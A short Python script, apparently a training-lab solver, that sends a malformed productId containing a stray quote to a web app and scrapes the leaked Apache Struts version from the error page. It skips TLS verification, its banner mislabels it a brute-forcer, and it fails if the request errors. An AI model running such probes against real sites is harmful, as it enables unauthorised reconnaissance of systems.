import requests,argparse,urllib3,re
from random import randrange
from termcolor import colored,COLORS
from colorama import init
from pyfiglet import figlet_format,FigletFont

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def banner(name):
    # generating randfonts.
    List=FigletFont.getFonts()
    random_numbner=randrange(len(List)-1)
    random_font=List[random_numbner]

    # generating randcolors
    color=[]
    for i in COLORS:
        if i !='black' and i!='light_blue' and i!='grey':
            color.append(i)
    random_numbner=randrange(len(color)-1)
    random_colore=color[random_numbner]

    #  printing the banner 
    font=figlet_format(name,font=random_font)
    print(colored(font,random_colore))
    print(colored("Build a Simple brute forcing Script with Python", 'yellow'))
    print(colored("Author: @oussamabinike\n", 'yellow'))

def parsearg():
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('-u','--url',
                        dest='url',
                        help='url for the target ex : https://www.example.com',
                        required=True)
    parser.add_argument('-cookie','--cookie',
                        dest='cookie',
                        help='your session cookie',
                        required=True)
    return parser.parse_args()

def solution(s,url,cookie):
    URL=url+"/product?productId='"
    try:
        res=s.get(URL,verify=False,cookies=cookie,allow_redirects=True,timeout=1)
        pattern = re.compile(r'Apache Struts (.+)')
        match = pattern.search(res.text)
    except Exception as e:
        print(colored(e,'red'))
    return match.group()

def main():
    banner('information-disclosure')

    url=parsearg().url
    cookie=parsearg().cookie

    cookie={'session':cookie}
    URL=str(url).rstrip('/')

    s=requests.session()
    aptach_version=solution(s=s,url=URL,cookie=cookie)

    print(colored(aptach_version,'green'))
    print(colored('finiched.....','red'))
    
if __name__=='__main__':
    main()
   
